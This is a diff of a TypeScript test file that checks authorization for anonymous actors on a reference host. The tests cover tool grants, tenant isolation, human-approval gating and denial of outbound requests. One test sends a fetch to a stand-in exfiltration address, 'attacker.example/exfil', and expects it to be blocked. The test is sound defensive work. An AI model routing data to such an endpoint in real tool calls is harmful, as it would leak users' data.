@@ -1,7 +1,7 @@
 /**
  * RFC 0132 (Draft) — anonymous-actor authorization, reference host.
  * PHASE 1 (read tier) + PHASE 2 (bounded-write-egress tier) + the conformance
- * witness seam (/v1/host/sample/anon-surface/*).
+ * witness seam (/host/sample/anon-surface/*).
  *
  * Behavioral coverage of the five §F invariants + the honest-off advertisement:
  *   - honest-off: the `anonymousActor` capability + the sample seam are OMITTED/404
@@ -82,17 +82,18 @@ function scriptedProvider(
 describe('RFC 0132 §B — discovery advertisement (honest-off / env-gated, both tiers)', () => {
   it('OMITS anonymousActor by default (honest-off)', async () => {
     delete process.env.OPENWOP_ANON_ACTOR_ENABLED;
-    const { body } = await getJson('/.well-known/openwop');
-    expect((body.capabilities as Record<string, unknown>).anonymousActor).toBeUndefined();
+    // ADR 0858 P3 slice 3 — the v2 record is projected under the same gate.
+    const v2 = await fetch(`${BASE}/.well-known/openwop`, { headers: { 'OpenWOP-Version': '2' } });
+    expect(((await v2.json()) as Record<string, unknown>).anonymousActor).toBeUndefined();
   });
 
   it('advertises both tiers + hitl control when enabled', async () => {
     process.env.OPENWOP_ANON_ACTOR_ENABLED = 'true';
     try {
-      const { body } = await getJson('/.well-known/openwop');
-      expect((body.capabilities as Record<string, unknown>).anonymousActor).toEqual({
-        supported: true, tiers: ['read', 'bounded-write-egress'], writeEgressControls: ['hitl'], failClosed: true,
-      });
+      const v2 = await fetch(`${BASE}/.well-known/openwop`, { headers: { 'OpenWOP-Version': '2' } });
+      const { status: _s, since: _si, until: _u, witness: _w, ...facets } = ((await v2.json()) as Record<string, Record<string, unknown>>).anonymousActor ?? {};
+      // v1's `supported` is dropped: at major 2 presence is the claim.
+      expect(facets).toEqual({ tiers: ['read', 'bounded-write-egress'], writeEgressControls: ['hitl'], failClosed: true });
     } finally {
       delete process.env.OPENWOP_ANON_ACTOR_ENABLED;
     }
@@ -232,7 +233,7 @@ describe('RFC 0132 §A — the owner witness on a widget run', () => {
   });
 });
 
-// ── The conformance WITNESS seam (/v1/host/sample/anon-surface/*) ──
+// ── The conformance WITNESS seam (/host/sample/anon-surface/*) ──
 describe('RFC 0132 — the sample conformance seam', () => {
   beforeAll(() => { process.env.OPENWOP_ANON_ACTOR_ENABLED = 'true'; });
   afterAll(() => { delete process.env.OPENWOP_ANON_ACTOR_ENABLED; });
@@ -240,17 +241,17 @@ describe('RFC 0132 — the sample conformance seam', () => {
   it('honest-off: the seam 404s when disabled', async () => {
     delete process.env.OPENWOP_ANON_ACTOR_ENABLED;
     try {
-      expect((await getJson('/v1/host/sample/anon-surface/tools?surface=sample-public-widget')).status).toBe(404);
-      expect((await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read' })).status).toBe(404);
+      expect((await getJson('/host/sample/anon-surface/tools?surface=sample-public-widget')).status).toBe(404);
+      expect((await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read' })).status).toBe(404);
     } finally {
       process.env.OPENWOP_ANON_ACTOR_ENABLED = 'true';
     }
   });
 
   it('GET /tools returns the EXPLICIT grant only (fails empty on unknown surface)', async () => {
-    const configured = await getJson('/v1/host/sample/anon-surface/tools?surface=sample-public-widget');
+    const configured = await getJson('/host/sample/anon-surface/tools?surface=sample-public-widget');
     expect(configured.body.tools).toEqual([{ name: 'catalog.read' }, { name: 'lead.capture' }, { name: 'http.fetch' }]);
-    const unknown = await getJson('/v1/host/sample/anon-surface/tools?surface=nope');
+    const unknown = await getJson('/host/sample/anon-surface/tools?surface=nope');
     expect(unknown.body.tools).toEqual([]);
   });
 
@@ -258,12 +259,12 @@ describe('RFC 0132 — the sample conformance seam', () => {
     // The hardened publicGateway precedent: an unknown surface must not 400/leak that
     // it does not exist (vs an existing-but-forbidden one). A missing tool on a KNOWN
     // surface, by contrast, is an honest 400 (the caller already reached the surface).
-    expect((await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'nope', tool: 'catalog.read' })).status).toBe(404);
-    expect((await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget' })).status).toBe(400);
+    expect((await postJson('/host/sample/anon-surface/dispatch', { surface: 'nope', tool: 'catalog.read' })).status).toBe(404);
+    expect((await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget' })).status).toBe(400);
   });
 
   it('read tier: catalog.read → allowed anon-granted + owner.principalKind anonymous + result; NO canary', async () => {
-    const { body, text } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read', args: { probeSecrets: true } });
+    const { body, text } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read', args: { probeSecrets: true } });
     const decided = body.authorizationDecided as { payload: { allowed: boolean; reason: string; principal: string; resource: string } };
     expect(decided.payload).toEqual(expect.objectContaining({ allowed: true, reason: 'anon-granted', resource: 'tenant:sample-anon-tenant' }));
     expect(decided.payload.principal).toMatch(/^anon:sess-[0-9a-f]{16}$/);
@@ -274,7 +275,7 @@ describe('RFC 0132 — the sample conformance seam', () => {
   });
 
   it('read tier: a cross-tenant read fails closed (result OMITTED — no other-tenant data)', async () => {
-    const { body, text } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read', args: { tenant: 'other-tenant' } });
+    const { body, text } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'catalog.read', args: { tenant: 'other-tenant' } });
     // The read is granted, but a cross-tenant ask yields NOTHING — the result is omitted entirely.
     expect((body.authorizationDecided as { payload: { allowed: boolean } }).payload.allowed).toBe(true);
     expect(body.result).toBeUndefined();
@@ -282,27 +283,27 @@ describe('RFC 0132 — the sample conformance seam', () => {
   });
 
   it('ungranted baseline: crm.contact.delete → anon-not-granted, NO result', async () => {
-    const { body } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'crm.contact.delete' });
+    const { body } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'crm.contact.delete' });
     expect((body.authorizationDecided as { payload: { allowed: boolean; reason: string } }).payload).toEqual(expect.objectContaining({ allowed: false, reason: 'anon-not-granted' }));
     expect(body.result).toBeUndefined();
   });
 
   it('egress: http.fetch to an out-of-audience destination → anon-egress-denied, no credential, NO result', async () => {
-    const { body } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'http.fetch', destination: 'https://attacker.example/exfil' });
+    const { body } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'http.fetch', destination: 'https://attacker.example/exfil' });
     expect((body.authorizationDecided as { payload: { allowed: boolean; reason: string } }).payload).toEqual(expect.objectContaining({ allowed: false, reason: 'anon-egress-denied' }));
     expect(body.egressDecided).toEqual({ decision: 'denied', reason: 'out-of-audience', credentialAttached: false });
     expect(body.result).toBeUndefined();
   });
 
   it('bounded-write: lead.capture behind hitl → suspends on interrupt.approval, NO result', async () => {
-    const { body } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'lead.capture', args: { email: 'v@example.com' } });
+    const { body } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-public-widget', tool: 'lead.capture', args: { email: 'v@example.com' } });
     expect((body.authorizationDecided as { payload: { allowed: boolean; reason: string } }).payload).toEqual(expect.objectContaining({ allowed: true, reason: 'anon-granted' }));
     expect(body.interrupt).toEqual({ kind: 'approval' });
     expect(body.result).toBeUndefined();
   });
 
   it('uncontrolled surface: lead.capture with NO control → anon-write-ungated, NO result/interrupt', async () => {
-    const { body } = await postJson('/v1/host/sample/anon-surface/dispatch', { surface: 'sample-uncontrolled-surface', tool: 'lead.capture' });
+    const { body } = await postJson('/host/sample/anon-surface/dispatch', { surface: 'sample-uncontrolled-surface', tool: 'lead.capture' });
     expect((body.authorizationDecided as { payload: { allowed: boolean; reason: string } }).payload).toEqual(expect.objectContaining({ allowed: false, reason: 'anon-write-ungated' }));
     expect(body.interrupt).toBeUndefined();
     expect(body.result).toBeUndefined();
